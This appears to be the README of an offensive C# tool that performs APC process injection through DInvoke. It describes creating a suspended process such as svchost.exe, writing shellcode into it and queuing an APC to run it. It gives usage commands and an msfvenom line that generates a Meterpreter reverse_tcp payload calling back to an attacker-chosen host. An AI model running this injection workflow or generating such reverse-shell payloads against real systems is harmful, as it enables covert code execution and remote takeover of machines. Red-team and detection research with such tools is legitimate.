# CS-Dinvoke-APCInjection
DInvoke version API call QueueUserAPC. 

Open a process in a suspended state, allocate some memory into it, write shellcode into that allocated region, queue and APC to the thread and then resume it. Please note that no Anti-virus or EDR bypass has been implemented.

	Example:
	APCInjection.exe -f beacon.bin -a "C:\Windows\System32\svchost.exe"
	APCInjection.exe -f "C:\temp\beacon.bin" -a "C:\Windows\System32\svchost.exe"
	
	APCInjection.exe
	Default using payload with beacon.bin at current directory and open process with svchost.exe

For the rawfile, can generate with msfvenom to test:

	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -o beacon.bin -f raw

Reference: https://github.com/crypt0ace/CS-APCInjection
